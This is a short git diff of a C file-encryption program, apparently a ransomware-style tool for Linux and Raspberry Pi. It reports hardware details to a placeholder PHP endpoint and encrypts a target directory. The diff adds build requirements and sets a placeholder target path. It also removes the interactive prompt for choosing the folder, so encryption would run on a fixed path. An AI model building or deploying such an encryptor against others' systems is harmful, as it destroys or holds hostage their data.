@@ -1,6 +1,12 @@
 /*
     Author Jieyab89 
     Compile : gcc -o encrypt  encrypt.c -lcurl
+
+    Requirements 
+
+    sudo apt-get install lshw
+    sudo apt install curl
+    
     Usage ./encrypt
 */
 
@@ -20,7 +26,7 @@
 // Tested on Rasbbery pi on my IoT Projects 
 
 #define API_ENDPOINT "<host>/Api-simple-logen-encryption-Linux.php" //change this 
-#define TARGET_DIR "<path>"  // change this linux path
+#define TARGET_DIR "<change>"  // change this linux path
 
 struct hw_info {
     char name[255];
@@ -300,26 +306,6 @@ static int encrypt_files(const char *folder)
     closedir(dirp);
     printf("=============================================\n");
     return ret;
-}
-
-static int encrypt_folder(void)
-{
-    char folder[1024];
-    size_t len;
-
-    printf("Enter the folder name to be encrypted: ");
-    if (!fgets(folder, sizeof(folder), stdin)) {
-        puts("stdin closed!");
-        return 1;
-    }
-
-    len = strlen(folder);
-
-    if (folder[len - 1] == '\n') {
-        folder[len - 1] = '\0';
-    }
-
-    return encrypt_files(folder);
 }
 
 int main(void)
